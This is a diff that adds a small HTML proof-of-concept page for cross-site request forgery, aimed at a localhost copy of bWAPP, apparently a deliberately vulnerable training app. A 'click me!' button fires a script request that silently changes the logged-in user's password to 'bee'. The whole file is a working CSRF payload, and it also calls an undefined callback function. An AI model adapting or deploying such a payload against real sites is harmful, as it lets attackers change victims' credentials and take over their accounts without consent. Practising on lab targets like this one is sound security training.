@@ -1,0 +1,16 @@
+<html>
+	<h1>POC CSRF</h1>
+	<script>
+		function httpGet(theURL)
+		{
+			var xmlHttp = new XMLHttpRequest();
+			xmlHttp.onreadystatechange = function(){
+				if(xmlHttp.readyState == 4 && xmlHttp.status == 200)
+					callback(xmlHttp.responseText);
+			}
+			xmlHttp.open("GET",theURL,true);
+			xmlHttp.send(null);
+		}
+	</script>
+	<button onclick=httpGet("http://localhost/bWAPP/csrf_1.php?password_new=bee&password_conf=bee&action=change")>click me!</button>
+</html>
